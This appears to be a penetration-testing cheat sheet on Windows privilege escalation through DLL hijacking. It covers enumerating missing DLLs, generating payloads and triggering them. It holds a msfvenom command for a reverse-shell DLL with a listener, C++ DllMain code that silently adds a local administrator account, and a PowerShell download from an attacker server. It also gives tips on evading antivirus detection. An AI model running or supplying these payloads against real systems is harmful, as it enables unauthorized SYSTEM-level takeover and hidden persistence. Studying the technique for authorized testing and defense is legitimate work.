

> [!abstract] Privilege Escalation via DLL Hijacking
> **DLL Hijacking** (or DLL Side-Loading) is a privilege escalation technique where an attacker places a malicious DLL in a directory that a vulnerable application or service will search before finding the legitimate DLL. When the service starts, it loads the attacker's DLL with the same privileges as the service (often `NT AUTHORITY\SYSTEM`).
> **MITRE ATT&CK Mapping:** [T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/) | [T1574.002 - DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)

## How It Works

> [!info] Understanding the Windows DLL Search Order
> When a Windows application or service starts, it looks for the DLLs it needs to function. If the absolute path to the DLL is not specified, Windows searches for it in a specific order:
> 1. The directory from which the application loaded.
> 2. The system directory (`C:\Windows\System32`).
> 3. The 16-bit system directory.
> 4. The Windows directory (`C:\Windows`).
> 5. The current working directory.
> 6. Directories in the `PATH` environment variable.
> 
> **The Vulnerability:** If an application tries to load a DLL that doesn't exist, or if it searches a writable directory first, an attacker can place a malicious DLL in that path. When the service restarts, it loads the malware.

---

## Step 1: Enumeration (Finding Missing DLLs)

> [!tip]+ Finding the Vulnerable Service
> The best way to find DLL hijacking opportunities is by monitoring file system and process activity using **Sysinternals Process Monitor (Procmon)**. However, you can also use a PowerShell script to quickly identify missing modules.
> 
> **PowerShell Enumeration Script:**
> *Checks all running processes for missing DLL modules.*
> ```powershell
> Get-Process | ForEach-Object {
>     $_.Modules | ForEach-Object {
>         $dllPath = $_.FileName
>         $dllName = $_.ModuleName
>         if ($dllPath -and -not (Test-Path $dllPath)) {
>             Write-Host "Missing DLL: $dllName" -ForegroundColor Red
>             Write-Host "DLL Path: $dllPath" -ForegroundColor Yellow
>             Write-Host "--------------------------------------------"
>         }
>     }
> }
> ```
> *Filter Procmon for `Name Not Found` or `File Not Found` events related to the target service.*

---

## Step 2: Payload Generation

> [!danger]+ Method 1: Metasploit Payload (Quick Reverse Shell)
> Use `msfvenom` to generate a malicious DLL that sends a reverse shell back to your attacker machine.
> ```bash
> # Generate the malicious DLL
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -o malware.dll
> ```
> 
> **Setup the Listener:**
> ```bash
> msfconsole -qx "use exploit/multi/handler;set lhost x.x.x.x;set lport 4444;set payload windows/meterpreter/reverse_tcp;run -j"
> ```

> [!bug]+ Method 2: Custom C++ DLL (Living Off The Land)
> Sometimes AV detects `msfvenom` payloads. In this case, you can write a custom C++ DLL that executes native Windows commands (like adding a new local admin) using `system()`.
> 
> **C++ Code (`myDLL.cpp`):**
> ```cpp
> #include <stdlib.h>
> #include <windows.h>
> 
> BOOL APIENTRY DllMain( 
>     HANDLE hModule,                       // Handle to DLL module
>     DWORD ul_reason_for_call,             // Reason for calling function
>     LPVOID lpReserved                     // Reserved
> ) {
>     switch (ul_reason_for_call) {
>         case DLL_PROCESS_ATTACH:           // A process is loading the DLL.
>             int i; 
>             i = system("net user dave2 password123! /add");
>             i = system("net localgroup administrators dave2 /add");
>             break;
>         case DLL_THREAD_ATTACH:            // A process is creating a new thread.
>             break;
>         case DLL_THREAD_DETACH:            // A thread exits normally.
>             break; 
>         case DLL_PROCESS_DETACH:           // A process unloads the DLL.
>             break;
>     }
>     return TRUE;
> }
> ```
> **Compile on Linux (using MinGW):**
> ```bash
> x86_64-w64-mingw32-g++ myDLL.cpp --shared -o myDLL.dll
> ```

---

## Step 3: Execution (Delivery & Trigger)

> [!success]+ Uploading and Triggering the Payload
> Once you have your malicious DLL (`malware.dll` or `myDLL.dll`), you must place it in the exact directory the service is looking for (identified during enumeration). Then, restart the vulnerable service to trigger the payload execution.
> 
> **Upload the DLL to the Target:**
> ```powershell
> # Download the DLL from your attacker web server
> powershell > iwr -UseBasicParsing -uri http://172.20.10.1:8080/myDLL.dll -OutFile myDLL.dll
> ```
> 
> **Trigger the Payload (Restart the Service):**
> *Note: You need permissions to restart the service. Sometimes the service restarts automatically on failure, or you might have the `SeShutdownPrivilege` to reboot the machine.*
> ```powershell
> # Restart the vulnerable service (e.g., Betaservice)
> Restart-Service Betaservice
> ```

> [!warning] OPSEC & Considerations
> - **Service Permissions:** You cannot restart a service unless your current user has the required permissions (e.g., `SERVICE_START` or `SERVICE_STOP`). Check with `sc qc <ServiceName>` or AccessChk.
> - **AV/EDR:** If you use the C++ method, Windows Defender may flag the `system("net user ... /add")` command. Consider using Win32 API calls (like `NetUserAdd`) instead of `system()` for stealth.
> - **Stability:** If the legitimate application expects functions from the missing DLL, your hijack might crash the application. For persistence, attackers often use "DLL Proxying" (forwarding legitimate calls to the real DLL while executing malicious code), but for a quick Privilege Escalation, a simple `DllMain` execution is usually sufficient.

